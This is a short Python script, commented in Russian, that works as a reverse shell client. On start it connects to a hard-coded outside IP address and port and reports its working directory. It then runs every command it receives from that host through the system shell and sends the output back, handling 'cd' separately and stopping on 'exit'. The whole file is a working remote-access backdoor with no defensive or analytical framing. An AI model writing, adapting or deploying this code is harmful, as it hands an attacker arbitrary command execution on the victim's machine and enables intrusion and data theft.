import socket
import os
import subprocess


SERVER_HOST = "158.181.233.163"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "---"
s = socket.socket() 
s.connect((SERVER_HOST, SERVER_PORT)) 
cwd = os.getcwd() 
s.send(cwd.encode()) 



while True:
    command = s.recv(BUFFER_SIZE).decode()
    
    splited_command = command.split(SEPARATOR)
    if command.lower() == "exit": 
        break
    if "cd " in command: 
        try:
            """
            Удаляем "cd"
            меняем каталог на тот, который указан в строке
            """
            directory = str(command).replace('cd ', '').strip()
            os.chdir(str(directory))
        except FileNotFoundError as e: #если файл не найден, передаем ошибку
            output = str(e)
        else:
            output = "" #Если ни один из исключений не произошел, переопределяем вывод в пустую строку
    else: #А если это не команда "cd", просто исполняем эту команду и возвращаем вывод
        output = subprocess.getoutput(command)
    cwd = os.getcwd() #Получаем рабочий каталог
    message = f"{output}{SEPARATOR}{cwd}" #Формируем наш ответ серверу
    s.send(message.encode()) #Отправляем

#Если цикл прерван, закрываем сокет
s.close()